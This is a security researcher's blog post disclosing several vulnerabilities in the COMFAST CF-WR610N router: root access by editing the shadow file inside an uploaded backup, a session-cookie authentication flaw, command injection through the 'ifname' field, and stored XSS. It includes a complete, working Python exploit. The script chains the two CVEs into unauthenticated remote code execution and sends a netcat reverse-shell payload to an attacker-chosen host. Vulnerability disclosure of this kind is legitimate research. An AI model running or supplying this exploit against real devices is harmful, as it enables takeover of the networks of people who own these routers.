<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.26.2 by Michael Rose
  Copyright 2013-2024 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->

<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>COMFAST CF-WR610N Wireless Router Multiple Vulnerabilities - Sn0ox</title>
<meta name="description" content="Details on vulnerabilities found in COMFAST CF-WR610N wireless router. This is probably one of the most vulnerable routers I have ever tested, with several different ways of getting shell access.">


  <meta name="author" content="Sn0ox">
  
  <meta property="article:author" content="Sn0ox">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Sn0ox">
<meta property="og:title" content="COMFAST CF-WR610N Wireless Router Multiple Vulnerabilities">
<meta property="og:url" content="https://sn0ox.github.io//research/2023/02/05/CVE-COMFAST-CF-WR610N.html">


  <meta property="og:description" content="Details on vulnerabilities found in COMFAST CF-WR610N wireless router. This is probably one of the most vulnerable routers I have ever tested, with several different ways of getting shell access.">







  <meta property="article:published_time" content="2023-02-05T00:00:00-08:00">






<link rel="canonical" href="https://sn0ox.github.io//research/2023/02/05/CVE-COMFAST-CF-WR610N.html">












<!-- end _includes/seo.html -->



  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Sn0ox Feed">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
  
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single" dir="ltr">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          Sn0ox
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a
                href="/"
                
                
              >Home</a>
            </li><li class="masthead__menu-item">
              <a
                href="/categories/"
                
                
              >Categories</a>
            </li><li class="masthead__menu-item">
              <a
                href="/posts/"
                
                
              >Posts</a>
            </li><li class="masthead__menu-item">
              <a
                href="/about/"
                
                
              >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      





<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person" class="h-card">

  
    <div class="author__avatar">
      <a href="https://sn0ox.github.io//">
        <img src="/assets/images/avatar.png" alt="Sn0ox" itemprop="image" class="u-photo">
      </a>
    </div>
  

  <div class="author__content">
    <h3 class="author__name p-name" itemprop="name">
      <a class="u-url" rel="me" href="https://sn0ox.github.io//" itemprop="url">Sn0ox</a>
    </h3>
    
      <div class="author__bio p-note" itemprop="description">
        <p>Security Researcher</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/diogo-tom%C3%A1s-ferreira" itemprop="sameAs" rel="nofollow noopener noreferrer me">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span>
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/sn0ox" itemprop="sameAs" rel="nofollow noopener noreferrer me">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span>
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="COMFAST CF-WR610N Wireless Router Multiple Vulnerabilities">
    <meta itemprop="description" content="Details on vulnerabilities found in COMFAST CF-WR610N wireless router. This is probably one of the most vulnerable routers I have ever tested, with several different ways of getting shell access.">
    <meta itemprop="datePublished" content="2023-02-05T00:00:00-08:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">
            <a href="https://sn0ox.github.io//research/2023/02/05/CVE-COMFAST-CF-WR610N.html" itemprop="url">COMFAST CF-WR610N Wireless Router Multiple Vulnerabilities
</a>
          </h1>
          

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          7 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right sticky">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li><a href="#intro">Intro</a></li><li><a href="#history">History</a></li><li><a href="#physical-recon">Physical Recon</a></li><li><a href="#shell-from-backups">Shell from backups</a></li><li><a href="#cve-2022-45724-broken-authentication-framework">CVE-2022-45724 Broken authentication framework</a></li><li><a href="#cve-2022-45725-improper-input-validation-leading-to-rce">CVE-2022-45725 Improper Input Validation leading to RCE</a></li><li><a href="#unauthenticated-exploit">Unauthenticated exploit</a></li><li><a href="#multiple-xss">Multiple XSS</a></li></ul>
            </nav>
          </aside>
        
        <p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/comfast_router.jpg" alt="drawing" width="500" />
</p>
<p><br /></p>

<p>This post contains detailed information about a security research that i have been conducting on a COMFAST CF-WR610N wireless router. I tried to contact Comfast but there were no emails or contacts available besides a LinkedIn profile that belongs to a single person, which required me to connect in order to send messages, which I refuse to do. I didn’t gave up and I frequently searched for contact information and when I noticed they got a new website, I was finally able to get an email address. I sent an email but never got an answer, so I figure that they just don’t care about and don’t want people to reach out, so I decided to publish my findings with the RCE exploit that I have also developed.</p>

<h2 id="intro">Intro</h2>

<p>I came accross COMFAST CF-WR610N while searching for a cheap wireles router fora project that I wanted to do, but after buying it I decided to do a bit of security research before putting it to use… And i am glad I did, since this is probably the worst router in terms of security I’ve ever tested! From a poorly designed feature that allows easy shell access, to remote code execution, a laughable authentication/autorization framework and a ridiculous amount of XSS, this router ticks all the boxes!</p>

<ul>
  <li>Affected firmware: V2.3.1 (and bellow)</li>
</ul>

<h2 id="history">History</h2>
<ul>
  <li>17/11/2022 - Vulnerability found</li>
  <li>18/11/2022 - CVE-ID requested</li>
  <li>09/02/2023 - CVE-2022-45724 and CVE-2022-45725 were reserved.</li>
</ul>

<h2 id="physical-recon">Physical Recon</h2>

<p>First thing I did after I got the router was open it up!</p>
<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/pcb.png" alt="drawing" width="600" />
</p>

<p>The PCB exposed the UART interface, which had the pins available and marked for easy access… how nice of them!
My initial thought was to connect to it in order to get access to the system, but my USB TTL adapter was broken, and I was waiting on a new one to arrive, so I decided to explore other options.<br /> 
The port scan revealed that SSH was available on the default port, although the user manual didn’t say anything about it… seemed to be a good starting point, but unfortunately none of the default usernames/password combinations that I tried worked, so I moved on.</p>

<h2 id="shell-from-backups">Shell from backups</h2>
<p>Having to wait for the USB TTL adapter to access the UART interface, I switch my focus to the web application.<br />
While looking and exploring the application, the first thing I noticed was the Backup option.<br />
I remember a recent security assessment that I did where I was able to exploit this mechanism to get shell access, and so I decided to start there.<br /></p>

<p>This was the usual backup feature that I was expecting, I had the possibility of downloading a backup file and another option to upload a backup file, simple enough.</p>

<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/backup_feature.png" alt="drawing" width="600" />
</p>

<p>The backup file was just a tar inside a gzip. After decompressing all of this, I got an <strong>etc</strong> directory, which is always a good sign! Inside there were a lot of files</p>

<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/etc_directory.png" alt="drawing" width="600" />
</p>

<p>An interesting one was off course the shadow file, as it contains user hashed credentials!</p>

<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/shadow_file.png" alt="drawing" width="600" />
</p>

<p>Used hashcat to try to crack this password, but no luck… Apparently, this password was the only good thing about this router, since it was not possible to crack it! <br />
After this, I started thinking about a way to overcome this issue, when I realized “well, why not just change the password in the shadow file and upload it”? Seemed to be a good Idea, so I started by generating a new password using</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> salt root
</code></pre></div></div>
<p>And stored the output in the shadow file, replacing the existing one</p>
<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/shadow_file_edited.png" alt="drawing" width="600" />
</p>

<p>Afterward I generated a new backup file (gzip compressed) - it needs to have the extension “file” otherwise it fails, so the file needs to be “backup.file”. The upload was successful and after waiting about 60 seconds for everything to restart, I tried using the SSH and go access!</p>
<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/ssh_access.png" alt="drawing" width="600" />
</p>

<h2 id="cve-2022-45724-broken-authentication-framework"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-45724">CVE-2022-45724</a> Broken authentication framework</h2>
<p>While I was using the web application, I collected all the requests with BURP and one of the things I noticed was that, when user was logged in, if another unauthenticated request was made to certain pages, I would get a new COMFAST_SESSIONID cookie from the server that I could use to perform authenticated requests!</p>
<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/getting_session.png" alt="drawing" width="600" />
</p>

<p>So I decided to make an authenticated GET request to the “/cgi-bin/system-status” page using curl to try to get a new cookie, and it worked. This did in fact generated a new session ID, which is really strange because for some reason the framework works perfectly well when there is no user already logged in, but if there is, it assumes a completely different behavior and although it redirects you to the login page if you try this on a private window, it still generates valid session IDs!<br /></p>

<p>So, using the new cookie to tried to change something in the application, just to ensure that I did in fact have a valid cookie.</p>
<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/using_session.png" alt="drawing" width="600" />
</p>

<p>As you can see, it worked. This meant that, anyone could simply get a valid Cookie, <strong>as long as a user is logged in</strong>, without any credentials, and perform unauthenticated requests.</p>

<h2 id="cve-2022-45725-improper-input-validation-leading-to-rce"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-45725">CVE-2022-45725</a> Improper Input Validation leading to RCE</h2>
<p>With the SSH access, I located the web server binary along with other binaries that I saw were running by default, and started looking at those. I use Ghidra to reverse engineer binary files, and I got a few plugins [Rhabdomancer] (https://github.com/0xdea/ghidra-scripts/blob/main/Rhabdomancer.java) and [Haruspex] (https://raw.githubusercontent.com/0xdea/ghidra-scripts/main/Haruspex.java) to help find juicy methods that would allow me to get code execution. After a bit of searching and back and forth with all the binaries since some of those were APIs that were used by other binaries, I found that, when setting the firewall configuration, the ifname variable looked promising.
By default in most methods the application would set this using WAN or LAN</p>
<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/ghidra_1.png" alt="drawing" width="600" />
</p>

<p>But here the ifname variable was being used directly without any input verification, and since this would also be used on a local command, it looked even more promising.</p>

<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/ghidra_2.png" alt="drawing" width="600" />
</p>

<p>This behavior happened in other variables as well, but following the rest of the code flow I confirmed that ifname was the only (that I saw) that would actually be used in a system call, so I tried a quick test to create a file in the tmp directory.</p>

<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/touch_test.png" alt="drawing" width="600" />
</p>

<p>And it worked!</p>
<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/touch_success.png" alt="drawing" width="600" />
</p>

<p>From here, getting a reverse shell was easy! And since (from the previous vulnerability) I know that, under certain conditions, I can force the server to generate a session ID, triggering this vulnerability could be achieved by an unauthenticated user. After getting a session cookie, I just had to use it to make a new request in order to get a reverse shell.</p>

<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/rce_request.png" alt="drawing" width="600" />
</p>

<p>And got a shell</p>
<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/rce_shell.png" alt="drawing" width="600" />
</p>

<h2 id="unauthenticated-exploit">Unauthenticated exploit</h2>

<p>It is possible to combine and take advantage of both CVE-2022-45724 and CVE-2022-45725 to achieve an unauthenticated RCE (as long as there is a user logged in, in order to trigger the bug in the authentication framework)</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">rich.console</span> <span class="kn">import</span> <span class="n">Console</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="n">console</span> <span class="o">=</span> <span class="n">Console</span><span class="p">()</span>
<span class="n">PAYLOAD</span> <span class="o">=</span> <span class="s">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc %s %s &gt;/tmp/f"</span>
<span class="n">proto</span> <span class="o">=</span> <span class="s">"http://"</span>

<span class="n">SESSION_ID_URI</span><span class="o">=</span><span class="s">"/cgi-bin/system-status?method=GET&amp;section=language"</span>
<span class="n">EXPLOIT_URI</span><span class="o">=</span><span class="s">"/cgi-bin/mbox-config?method=SET&amp;section=arp_bind_list"</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>

    <span class="n">arg_parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Comfast CF-WR6110N Unauthenticated RCE'</span><span class="p">)</span>
    <span class="n">arg_parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-rh'</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">'host'</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s">"192.168.10.1"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Host. (Default is 192.168.10.1)'</span><span class="p">)</span>
    <span class="n">arg_parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-s'</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">"secure"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">'store_true'</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'For HTTPS usage instead of HTTP. Default is HTTP'</span><span class="p">)</span>
    <span class="n">arg_parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-lh'</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">"attacker_host"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Attacker host address'</span><span class="p">)</span>
    <span class="n">arg_parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-lp'</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">"attacker_port"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Attacker host port'</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">arg_parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="n">console</span><span class="p">.</span><span class="k">print</span><span class="p">(</span><span class="s">"Don't forget to run a listener to get the reverse shell!"</span><span class="p">,</span> <span class="n">style</span><span class="o">=</span><span class="s">"bold red"</span><span class="p">)</span>


    <span class="n">host</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">host</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">secure</span><span class="p">:</span>
        <span class="n">proto</span> <span class="o">=</span> <span class="s">"https://"</span>
    

    <span class="n">console</span><span class="p">.</span><span class="k">print</span><span class="p">(</span><span class="s">"POST request to get the server to generate a valid COMFAST_SESSIONID"</span><span class="p">,</span> <span class="n">style</span><span class="o">=</span><span class="s">"bold"</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">proto</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="n">SESSION_ID_URI</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-type'</span><span class="p">:</span> <span class="s">'application/json'</span><span class="p">,</span> <span class="s">'Accept'</span><span class="p">:</span> <span class="s">'text/plain'</span><span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

    <span class="n">console</span><span class="p">.</span><span class="k">print</span><span class="p">(</span><span class="s">"Running exploit!"</span><span class="p">,</span> <span class="n">style</span><span class="o">=</span><span class="s">"bold"</span><span class="p">)</span>
    <span class="n">attacker_host</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">attacker_host</span>
    <span class="n">attacker_port</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">attacker_port</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">PAYLOAD</span><span class="o">%</span><span class="p">(</span><span class="n">attacker_host</span><span class="p">,</span> <span class="n">attacker_port</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'add_list'</span><span class="p">:</span> <span class="p">[{</span><span class="s">'ip'</span><span class="p">:</span> <span class="s">'192.168.1.1'</span><span class="p">,</span> <span class="s">'mac'</span><span class="p">:</span> <span class="s">'dc:4e:f4:08:68:19'</span><span class="p">,</span> <span class="s">'ifname'</span><span class="p">:</span> <span class="s">'lan;'</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="s">'remark'</span><span class="p">:</span> <span class="s">''</span><span class="p">}],</span> <span class="s">'operate'</span><span class="p">:</span> <span class="s">'add'</span><span class="p">}</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">proto</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="n">EXPLOIT_URI</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-type'</span><span class="p">:</span> <span class="s">'application/json'</span><span class="p">,</span> <span class="s">'Accept'</span><span class="p">:</span> <span class="s">'text/plain'</span><span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

    <span class="n">console</span><span class="p">.</span><span class="k">print</span><span class="p">(</span><span class="s">"Exploit successful. Enjoy your shell :-)"</span><span class="p">,</span> <span class="n">style</span><span class="o">=</span><span class="s">"bold"</span><span class="p">)</span>


</code></pre></div></div>

<h2 id="multiple-xss">Multiple XSS</h2>
<p>While testing, I also found that most of the fields of the web application were vulnerable to XSS due to the lack of input validation.</p>
<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/xss_input.png" alt="drawing" width="600" />
</p>

<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/xss_trigger.png" alt="drawing" width="600" />
</p>

<p>Here is a list of vulnerable fields:<br /></p>
<ul>
  <li>VLAN setup menu</li>
    <ul>
      <li>netmask</li>
      <li>comments</li>
      <li>ipaddr</li>
    </ul>
  <li>DHCP Settings &gt; Static list</li>
    <ul>
      <li>commentname</li>
      <li>ip</li>
    </ul>
  <li>Bandwidth control &gt; Pp limit</li>
    <ul>
      <li>comment</li>
      <li>ip</li>
    </ul>
</ul>

<p>I also found that most of the input validation were being made via JavaScript, so client-side only, which is easily bypassed! An example is the one below, where the field restricts the length to 32 characters only</p>

<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/clientside_bypass.png" alt="drawing" width="600" />
</p>

<p align="center">
    <img src="/assets/images/comfast_cf_wr610n_vulnerabilities/clientside_trigger.png" alt="drawing" width="600" />
</p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2023-02-05T00:00:00-08:00">February 5, 2023</time></p>

      </footer>

      <section class="page__share">
  <h4 class="page__share-title">Share on</h4>

  <a href="https://twitter.com/intent/tweet?text=COMFAST+CF-WR610N+Wireless+Router+Multiple+Vulnerabilities%20https%3A%2F%2Fsn0ox.github.io%2F%2Fresearch%2F2023%2F02%2F05%2FCVE-COMFAST-CF-WR610N.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsn0ox.github.io%2F%2Fresearch%2F2023%2F02%2F05%2FCVE-COMFAST-CF-WR610N.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://sn0ox.github.io//research/2023/02/05/CVE-COMFAST-CF-WR610N.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/research/2022/08/26/HSQL-to-shell-access.html" class="pagination--pager" title="HSQL to shell access">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>


    </div>

    
  </article>

  
  
</div>

      
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    
      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
    
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 <a href="https://sn0ox.github.io/">Sn0ox</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>




<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-6FW39BECF2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-6FW39BECF2');
</script>





  </body>
</html>
